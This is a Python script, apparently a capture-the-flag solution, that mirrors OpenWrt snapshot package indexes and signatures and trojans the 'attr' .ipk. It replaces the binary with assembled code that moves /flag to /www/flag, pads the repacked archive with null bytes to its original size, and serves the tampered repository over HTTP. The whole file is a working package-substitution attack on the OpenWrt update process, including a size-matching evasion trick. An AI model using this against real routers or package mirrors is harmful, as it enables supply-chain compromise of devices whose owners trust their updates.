import os
import subprocess
import shutil

# 创建一个名为 'pack' 的目录，并且进入这个目录
def create_pack_directory():
    os.makedirs("pack", exist_ok=True)
    os.chdir("pack")

# 从指定的URLs下载文件
def download_files():
    # 定义需要下载的文件的URLs
    urls = [
        "http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.gz",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.sig",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.gz",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.sig",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.gz",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.sig",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.gz",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.sig",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.gz",
        "http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.sig",
        "http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.gz",
        "http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.sig"
    ]
    
    # 遍历URL列表，使用wget命令下载每个URL指向的文件
    for url in urls:
        subprocess.run(["wget", "-x", url])
    
    # 重命名下载的目录，并删除不需要的父目录
    os.rename("downloads.openwrt.org/snapshots", "snapshots")
    if os.path.exists("downloads.openwrt.org"):
        shutil.rmtree("downloads.openwrt.org")

# 修改一个已下载的包文件
def modify_package():
    # 下载指定的文件
    subprocess.run(["wget", "http://downloads.openwrt.org/snapshots/packages/x86_64/packages/attr_2.5.1-1_x86_64.ipk"])
    
    # 获取原始文件的大小
    original_size = os.path.getsize("attr_2.5.1-1_x86_64.ipk")
    
    # 解压下载的文件
    subprocess.run(["tar", "zxf", "attr_2.5.1-1_x86_64.ipk"])
    os.remove("attr_2.5.1-1_x86_64.ipk")

    # 创建名为"data"的目录并进入
    os.makedirs("data", exist_ok=True)
    os.chdir("data")
    # 解压 data.tar.gz 文件
    subprocess.run(["tar", "zxvf", "../data.tar.gz"])
    os.remove("../data.tar.gz")

    # 定义要注入的汇编代码
    asm_code = [
        "section  .data",
        "oldpath db '/flag', 0",
        "newpath db '/www/flag', 0",
        "section  .text",
        "global   _start",
        "_start:",
        " mov  rdi, oldpath",
        " mov  rsi, newpath",
        " mov  rax, 82",
        " syscall",
        " mov  eax,60",
        " xor  rdi,rdi",
        "syscall"
    ]
    
    # 将汇编代码写入文件
    with open("/tmp/pwned.asm", "w") as f:
        f.write("\n".join(asm_code))

    # 编译汇编代码为二进制可执行文件
    subprocess.run(["nasm", "/tmp/pwned.asm", "-f", "elf64", "-o", "/tmp/pwned.o"])
    subprocess.run(["ld", "/tmp/pwned.o", "-o", "usr/bin/attr"])
    if not os.path.exists("usr/bin/attr") or os.path.getsize("usr/bin/attr") == 0:
        raise Exception("Error: usr/bin/attr is missing or empty!")
    
    # 将修改后的文件重新打包为 tar.gz 文件
    subprocess.run(["tar", "czvf", "../data.tar.gz", "."])
    os.chdir("..")
    shutil.rmtree("data")
    subprocess.run(["tar", "czvf", "attr_2.5.1-1_x86_64.ipk", "control.tar.gz", "data.tar.gz", "debian-binary"])

    # 删除不再需要的文件
    os.remove("control.tar.gz")
    os.remove("data.tar.gz")
    os.remove("debian-binary")

    # 获取修改后的文件大小，计算大小差值
    modified_size = os.path.getsize("attr_2.5.1-1_x86_64.ipk")
    size_delta = original_size - modified_size

    # 将修改后的文件大小调整为原始大小
    with open("attr_2.5.1-1_x86_64.ipk", "ab") as f:
        f.write(b'\0' * size_delta)

    # 下载另一个文件
    subprocess.run(["wget", "http://downloads.openwrt.org/snapshots/packages/x86_64/packages/libattr_2.5.1-1_x86_64.ipk"])

    # 创建目录并移动修改后的文件到目标位置
    os.makedirs("snapshots/packages/x86_64/packages", exist_ok=True)
    os.rename("attr_2.5.1-1_x86_64.ipk", "snapshots/packages/x86_64/packages/attr_2.5.1-1_x86_64.ipk")
    os.rename("libattr_2.5.1-1_x86_64.ipk", "snapshots/packages/x86_64/packages/libattr_2.5.1-1_x86_64.ipk")

# 启动一个简单的HTTP服务器
def start_server():
    # 切换到 "pack" 目录下
    os.chdir("../pack")
    # 使用 Python 内建的 http.server 模块启动服务器
    subprocess.run(["sudo", "python", "-m", "SimpleHTTPServer", "80"])

# 主程序入口
if __name__ == "__main__":
    create_pack_directory()
    download_files()
    modify_package()
    start_server()